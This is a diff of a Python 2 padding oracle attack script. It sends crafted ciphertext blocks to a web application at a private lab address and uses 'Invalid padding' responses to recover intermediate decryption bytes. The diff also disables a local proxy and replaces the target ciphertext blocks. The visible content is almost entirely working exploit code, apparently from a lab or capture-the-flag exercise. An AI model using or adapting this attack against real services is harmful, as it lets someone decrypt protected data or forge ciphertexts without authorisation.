@@ -3,18 +3,17 @@ import urllib
 import base64
 import binascii
 
-proxy = urllib2.ProxyHandler({'http': '127.0.0.1:8080'})
-opener = urllib2.build_opener(proxy)
-urllib2.install_opener(opener)
+# proxy = urllib2.ProxyHandler({'http': '127.0.0.1:8080'})
+# opener = urllib2.build_opener(proxy)
+# urllib2.install_opener(opener)
 
 url = "http://192.168.56.104/index.php"
-#enc = "\x87\xc5\x75\x34\xd1\xd9\xb2\xa3"
-#prepend = "\x59\x2c\x8f\x4f\x67\xef\xb6\xe5"
 intm = "\x00\x00\x00\x00\x00\x00\x00\x00"
-#iv = "\x00\x00\x00\x00\x00\x00\x00\x00"
-prepend = "\x87\xc5\x75\x34\xd1\xd9\xb2\xa3"
-prepend = "\x09\xf6\x31\x56\x7f\x39\x07\x87"
-enc = "\x75\xf7\x4c\x06\x06\x1a\xa9\x74"
+
+# Target decrypt block
+prepend = "\x10\x1f\x84\x95\x33\x3c\xc1\xab"
+# Previous block
+enc = "\x18\xc9\x9b\xbd\x2a\xe7\x5a\x19"
 
 padpos = 0x01
 
@@ -40,8 +39,7 @@ for pos in range(8, 0, -1):
         res = urllib2.urlopen(req)
         content = res.read()
         if content != "Invalid padding":
-            #found = 1
-            #print "intermediate: " + binascii.hexlify(intm[:pos-1])  + ":" + binascii.hexlify(intm[pos:])
+
             intm = intm[:pos-1] + chr(i ^ padpos) + intm[pos:]
             padpos = padpos + 1
             print "intermediate: " + binascii.hexlify(intm)
